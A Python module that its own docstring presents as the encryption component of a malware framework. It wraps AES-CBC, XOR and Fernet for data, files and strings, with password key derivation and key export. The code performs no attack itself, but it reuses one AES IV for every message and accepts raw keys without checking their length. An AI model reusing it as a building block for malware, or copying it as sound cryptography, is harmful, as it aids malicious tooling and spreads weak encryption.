#!/usr/bin/env python3
"""
Encryption Manager for Malware Framework
Handles encryption and decryption of data and communications
"""

import os
import base64
import hashlib
from typing import Dict, Any, Optional, Union
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
import logging

logger = logging.getLogger(__name__)

class EncryptionManager:
    """Manages encryption and decryption operations"""
    
    def __init__(self, config: Dict[str, Any]):
        """Initialize encryption manager"""
        self.config = config
        self.algorithm = config.get('algorithm', 'aes')
        self.key = self._generate_key(config.get('key'))
        self.iv = self._generate_iv()
        
        # Initialize cipher based on algorithm
        if self.algorithm == 'aes':
            self.cipher = self._init_aes_cipher()
        elif self.algorithm == 'xor':
            self.cipher = self._init_xor_cipher()
        elif self.algorithm == 'fernet':
            self.cipher = self._init_fernet_cipher()
        else:
            raise ValueError(f"Unsupported encryption algorithm: {self.algorithm}")
    
    def _generate_key(self, key: Optional[str] = None) -> bytes:
        """Generate encryption key"""
        if key:
            # Use provided key
            if isinstance(key, str):
                return key.encode('utf-8')
            return key
        
        # Generate random key
        if self.algorithm == 'aes':
            return os.urandom(32)  # 256-bit key
        elif self.algorithm == 'xor':
            return os.urandom(16)  # 128-bit key
        elif self.algorithm == 'fernet':
            return Fernet.generate_key()
        else:
            return os.urandom(32)
    
    def _generate_iv(self) -> bytes:
        """Generate initialization vector"""
        if self.algorithm == 'aes':
            return os.urandom(16)  # 128-bit IV
        return b''
    
    def _init_aes_cipher(self) -> Cipher:
        """Initialize AES cipher"""
        return Cipher(
            algorithms.AES(self.key),
            modes.CBC(self.iv),
            backend=default_backend()
        )
    
    def _init_xor_cipher(self) -> bytes:
        """Initialize XOR cipher (simple key)"""
        return self.key
    
    def _init_fernet_cipher(self) -> Fernet:
        """Initialize Fernet cipher"""
        return Fernet(self.key)
    
    def encrypt(self, data: Union[str, bytes]) -> bytes:
        """Encrypt data"""
        try:
            # Convert string to bytes if needed
            if isinstance(data, str):
                data = data.encode('utf-8')
            
            if self.algorithm == 'aes':
                return self._encrypt_aes(data)
            elif self.algorithm == 'xor':
                return self._encrypt_xor(data)
            elif self.algorithm == 'fernet':
                return self._encrypt_fernet(data)
            else:
                raise ValueError(f"Unsupported encryption algorithm: {self.algorithm}")
        
        except Exception as e:
            logger.error(f"Encryption failed: {e}")
            raise
    
    def decrypt(self, data: bytes) -> bytes:
        """Decrypt data"""
        try:
            if self.algorithm == 'aes':
                return self._decrypt_aes(data)
            elif self.algorithm == 'xor':
                return self._decrypt_xor(data)
            elif self.algorithm == 'fernet':
                return self._decrypt_fernet(data)
            else:
                raise ValueError(f"Unsupported encryption algorithm: {self.algorithm}")
        
        except Exception as e:
            logger.error(f"Decryption failed: {e}")
            raise
    
    def _encrypt_aes(self, data: bytes) -> bytes:
        """Encrypt data using AES"""
        # Pad data to block size
        block_size = 16
        padding_length = block_size - (len(data) % block_size)
        padded_data = data + bytes([padding_length] * padding_length)
        
        # Encrypt
        encryptor = self.cipher.encryptor()
        encrypted_data = encryptor.update(padded_data) + encryptor.finalize()
        
        # Return IV + encrypted data
        return self.iv + encrypted_data
    
    def _decrypt_aes(self, data: bytes) -> bytes:
        """Decrypt data using AES"""
        # Extract IV and encrypted data
        iv = data[:16]
        encrypted_data = data[16:]
        
        # Create cipher with extracted IV
        cipher = Cipher(
            algorithms.AES(self.key),
            modes.CBC(iv),
            backend=default_backend()
        )
        
        # Decrypt
        decryptor = cipher.decryptor()
        decrypted_data = decryptor.update(encrypted_data) + decryptor.finalize()
        
        # Remove padding
        padding_length = decrypted_data[-1]
        return decrypted_data[:-padding_length]
    
    def _encrypt_xor(self, data: bytes) -> bytes:
        """Encrypt data using XOR"""
        encrypted = bytearray()
        key_length = len(self.cipher)
        
        for i, byte in enumerate(data):
            key_byte = self.cipher[i % key_length]
            encrypted.append(byte ^ key_byte)
        
        return bytes(encrypted)
    
    def _decrypt_xor(self, data: bytes) -> bytes:
        """Decrypt data using XOR (same as encryption)"""
        return self._encrypt_xor(data)
    
    def _encrypt_fernet(self, data: bytes) -> bytes:
        """Encrypt data using Fernet"""
        return self.cipher.encrypt(data)
    
    def _decrypt_fernet(self, data: bytes) -> bytes:
        """Decrypt data using Fernet"""
        return self.cipher.decrypt(data)
    
    def encrypt_file(self, filepath: str, output_path: Optional[str] = None) -> bool:
        """Encrypt a file"""
        try:
            # Read file
            with open(filepath, 'rb') as f:
                data = f.read()
            
            # Encrypt data
            encrypted_data = self.encrypt(data)
            
            # Write encrypted file
            if output_path is None:
                output_path = filepath + '.encrypted'
            
            with open(output_path, 'wb') as f:
                f.write(encrypted_data)
            
            logger.info(f"File encrypted: {filepath} -> {output_path}")
            return True
        
        except Exception as e:
            logger.error(f"File encryption failed: {e}")
            return False
    
    def decrypt_file(self, filepath: str, output_path: Optional[str] = None) -> bool:
        """Decrypt a file"""
        try:
            # Read encrypted file
            with open(filepath, 'rb') as f:
                encrypted_data = f.read()
            
            # Decrypt data
            decrypted_data = self.decrypt(encrypted_data)
            
            # Write decrypted file
            if output_path is None:
                if filepath.endswith('.encrypted'):
                    output_path = filepath[:-10]
                else:
                    output_path = filepath + '.decrypted'
            
            with open(output_path, 'wb') as f:
                f.write(decrypted_data)
            
            logger.info(f"File decrypted: {filepath} -> {output_path}")
            return True
        
        except Exception as e:
            logger.error(f"File decryption failed: {e}")
            return False
    
    def encrypt_string(self, text: str) -> str:
        """Encrypt a string and return base64 encoded result"""
        try:
            encrypted_data = self.encrypt(text.encode('utf-8'))
            return base64.b64encode(encrypted_data).decode('utf-8')
        except Exception as e:
            logger.error(f"String encryption failed: {e}")
            raise
    
    def decrypt_string(self, encrypted_text: str) -> str:
        """Decrypt a base64 encoded string"""
        try:
            encrypted_data = base64.b64decode(encrypted_text.encode('utf-8'))
            decrypted_data = self.decrypt(encrypted_data)
            return decrypted_data.decode('utf-8')
        except Exception as e:
            logger.error(f"String decryption failed: {e}")
            raise
    
    def generate_key_from_password(self, password: str, salt: Optional[bytes] = None) -> bytes:
        """Generate encryption key from password using PBKDF2"""
        if salt is None:
            salt = os.urandom(16)
        
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=32,
            salt=salt,
            iterations=100000,
            backend=default_backend()
        )
        
        key = kdf.derive(password.encode('utf-8'))
        return key
    
    def get_key_hash(self) -> str:
        """Get hash of the encryption key"""
        return hashlib.sha256(self.key).hexdigest()
    
    def export_key(self, filepath: str) -> bool:
        """Export encryption key to file"""
        try:
            key_data = {
                'algorithm': self.algorithm,
                'key': base64.b64encode(self.key).decode('utf-8'),
                'iv': base64.b64encode(self.iv).decode('utf-8') if self.iv else None,
                'hash': self.get_key_hash()
            }
            
            import json
            with open(filepath, 'w') as f:
                json.dump(key_data, f, indent=2)
            
            logger.info(f"Key exported to: {filepath}")
            return True
        
        except Exception as e:
            logger.error(f"Key export failed: {e}")
            return False
    
    def import_key(self, filepath: str) -> bool:
        """Import encryption key from file"""
        try:
            import json
            with open(filepath, 'r') as f:
                key_data = json.load(f)
            
            self.algorithm = key_data['algorithm']
            self.key = base64.b64decode(key_data['key'].encode('utf-8'))
            self.iv = base64.b64decode(key_data['iv'].encode('utf-8')) if key_data['iv'] else b''
            
            # Reinitialize cipher
            if self.algorithm == 'aes':
                self.cipher = self._init_aes_cipher()
            elif self.algorithm == 'xor':
                self.cipher = self._init_xor_cipher()
            elif self.algorithm == 'fernet':
                self.cipher = self._init_fernet_cipher()
            
            logger.info(f"Key imported from: {filepath}")
            return True
        
        except Exception as e:
            logger.error(f"Key import failed: {e}")
            return False
    
    def get_info(self) -> Dict[str, Any]:
        """Get encryption manager information"""
        return {
            'algorithm': self.algorithm,
            'key_length': len(self.key),
            'key_hash': self.get_key_hash(),
            'iv_length': len(self.iv) if self.iv else 0
        } 